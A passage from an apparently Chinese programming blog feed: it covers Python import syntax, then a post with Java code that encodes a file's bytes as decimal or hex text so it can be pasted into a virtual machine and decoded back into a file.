class="language-ini">BoziBozi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h2><h3 id="在-Python-用-import-或者-from-import-来导入相应的模块。"><a href="#在-Python-用-import-或者-from-import-来导入相应的模块。" class="headerlink" title="在 Python 用 import 或者 from...import 来导入相应的模块。"></a>在 Python 用 <code>import</code> 或者 <code>from...import</code> 来导入相应的模块。</h3><ul><li>将整个模块（somemodule）导入：<code>import somedule</code></li><li>从某个模块中导入某个函数：<code>from somemodule import somefunction</code></li><li>从某个模块中导入多个函数：<code>from somemodule import firstfunc, secondfunc, thirdfunc...</code></li><li>将某个模块中的全部函数导入：<code>from somemodule import *</code></li></ul><p>例 1：导入 sys 模块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'==========Python import mode==============='</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'命令行参数为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'\n python 路径为：'</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例 2：导入 sys 模块的 argv 和 path 成员</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sys <span class="token keyword">import</span> argv<span class="token punctuation">,</span> path<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'==========Python import mode==============='</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'命令行参数为：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> argv<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'\n python 路径为：'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>导入特定的成员变量时不需要在变量前加 module 名称</p></blockquote><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>很多程序可移植性一些操作来查看一些基本信息，Python 可以使用 <code>-h</code> 参数查看各个参数帮助信息：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">$ python -husage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...Options and arguments (and corresponding environment variables):-c cmd : program passed in as string (terminates option list)<span class="token key attr-name">-d     : debug output from parser (also PYTHONDEBUG</span><span class="token punctuation">=</span><span class="token value attr-value">x)</span>-E     : ignore environment variables (such as PYTHONPATH)-h     : print this help message and exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I/O 流的简单应用</title>
      <link href="/2017/10/22/iopractise/"/>
      <url>/2017/10/22/iopractise/</url>
      
        <content type="html"><![CDATA[<p>最近使用虚拟机遇到一个有尴尬的问题：</p><ul><li>无法将文件复制到虚拟机中</li><li>但是可以复制纯文本内容粘贴到虚拟机中的编辑器里</li><li>由于特殊情况无法通过设置 VM tools 来解决上述问题…</li></ul><blockquote><p>这种情况下有没有其他办法能把文件复制到虚拟机中呢？</p></blockquote><span id="more"></span><h2 id="思考历程"><a href="#思考历程" class="headerlink" title="思考历程"></a>思考历程</h2><p>计算机底层就是 0 和 1 嘛！所以任何数据肯定是可以字符串来表示的。<br>这时，我就想到了输入输出流，我们通过代码来读取文件、修改文件、复制文件、上传及下载文件都是先将文件转化成流的不是吗？</p><p>例如下面这个复制文件的代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">forJava</span><span class="token punctuation">(</span><span class="token class-name">File</span> f1<span class="token punctuation">,</span><span class="token class-name">File</span> f2<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>    <span class="token keyword">long</span> time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token number">2097152</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FileOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> ins <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ins <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span>            out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>ins<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在复制文件的代码中，我们可以看到：</p><ol><li>程序先将原文件转化成了字节输入流</li><li>将字节输入流写入到字节输出流</li><li>将字节输出流转化成了新的文件</li></ol><p>这个字节流不就是一堆数字吗？把这些数字保存起来，存放到一个 txt 文本里，不就可以复制到虚拟机里了吗？</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>将上面的流程拆成两半，就可以实现从物理机复制文件到虚拟机中了：</p><ol><li>程序先将原文件转化成了字节输入流</li><li>将字节数组转换成字符串（用“,”分隔每个字节）存入 txt 文件</li><li>将 txt 文件中的文本复制粘贴到虚拟机中的空 txt 文件中</li><li>将 txt 文件中的文本读取出来，并转换成字节数组，并写入字节输出流中</li><li>将字节输出流转化成了新的文件</li></ol><p>代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//文件转 txt</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">file2Text</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token class-name">File</span> inFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> writeTxt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是一个文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>writeTxt<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        writeTxt<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    writeTxt<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BufferedWriter</span> textWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileWriter</span><span class="token punctuation">(</span>writeTxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>inFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bys<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> b <span class="token operator">=</span> bys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        textWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    textWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// txt 转文件</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">text2File</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token class-name">File</span> outFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> writeTxt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>outFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        outFile<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>writeTxt<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>writeTxt<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">BufferedReader</span> textReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>writeTxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>outFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> line <span class="token operator">=</span> textReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>line <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bys<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        line <span class="token operator">=</span> textReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    textReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a>效果图：</h3><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00gy1fl504quanuj20c20c676j.jpg" alt="文本内容"> <img src="http://wx3.sinaimg.cn/mw690/a6e9cb00gy1fl504pxerwj20ca0cajsi.jpg" alt="文件大小"></p><p>从效果图中可以看到，把数据转化为字节存入 txt 后，占用空间很大！<br>txt 文件大小甚至是原文件大小的 4 倍！每一个 byte 数值都要占用 1 到 4 位，<br>再加上我的虚拟机配置比较渣，拷贝这么多字符串进去很容易就编辑器搞挂了！<br>甚至连虚拟机都要一起跪…</p><h2 id="优化性能"><a href="#优化性能" class="headerlink" title="优化性能"></a>优化性能</h2><h3 id="Thinking-Again…"><a href="#Thinking-Again…" class="headerlink" title="Thinking Again…"></a>Thinking Again…</h3><p>怎么才能减少占用空间呢？</p><p>这时我突然想起，byte 是 java 数值型的基本类型啊！把它转化成 16 进制不就好了？<br>如果把 byte 转化成 16 进制的话，每一个 byte 都固定对应一个两位的 16 进制数字，<br>不会出现参差不齐的数字，这样的话连分隔符“,”都省下了！</p><h3 id="修改后的代码："><a href="#修改后的代码：" class="headerlink" title="修改后的代码："></a>修改后的代码：</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 文件转 txt</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">file2Text</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> txtPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token class-name">File</span> inFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> writeTxt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>txtPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是一个文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>writeTxt<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        writeTxt<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    writeTxt<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BufferedWriter</span> textWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileWriter</span><span class="token punctuation">(</span>writeTxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>inFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bys<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token function">bytes2HexString</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span> bys<span class="token punctuation">)</span><span class="token punctuation">;</span>        textWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        textWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    textWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//文件转多个 txt</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">file2Text</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">String</span> txtPath<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//记录当前 size</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//记录文件名</span>    <span class="token keyword">boolean</span> end <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> nameTmp<span class="token punctuation">;</span>    <span class="token class-name">String</span> curTxtPath <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> inFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>inFile<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是一个文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>inFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> directory <span class="token operator">=</span> txtPath<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> txtPath<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> txtPath<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>txtPath<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> txtPath<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token 